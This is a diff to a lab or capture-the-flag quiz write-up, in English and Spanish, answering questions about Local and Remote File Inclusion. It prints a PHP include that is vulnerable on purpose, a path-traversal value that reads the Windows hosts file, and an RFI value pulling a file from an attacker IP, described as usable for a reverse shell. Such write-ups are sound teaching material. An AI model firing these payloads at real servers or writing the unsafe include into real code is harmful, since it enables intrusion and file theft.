@@ -33,13 +33,43 @@ page
 
 ## [](#header-3) 5)   Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
 
+An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross-site Scripting (XSS). Typically, LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.
+The following is an example of PHP code that is vulnerable to LFI.
+
+
+```
+/**
+* Get the filename from a GET input
+* Example - http://example.com/?file=filename.php
+*/
+$file = $_GET['file'];
+
+/**
+* Unsafely include the file
+* Example - filename.php
+*/
+include('directory/' . $file);
+```
+
+In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.
+
+Fuente: https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/
+
 ```
 ../../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
 ## [](#header-3) 6)   Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
 
+Según wikipedia, una RFI es una vulnerabilidad existente solamente en páginas dinámicas en PHP que permite el enlace de archivos remotos situados en otros servidores a causa de una mala programación de la página que contiene funciones de inclusión de archivos.
+
+Por lo que incluyendo la línea de abajo en el campo "page" del url, podríamos conseguir que el servidor incluyese un fichero de nuestra máquina, por ejemplo, un archivo para hacer una reverse shell.
+
+```
 //10.10.14.6/somefile
+```
+
+Más información aquí: https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/
 
 ## [](#header-3) 7)    What does NTLM stand for? 
 
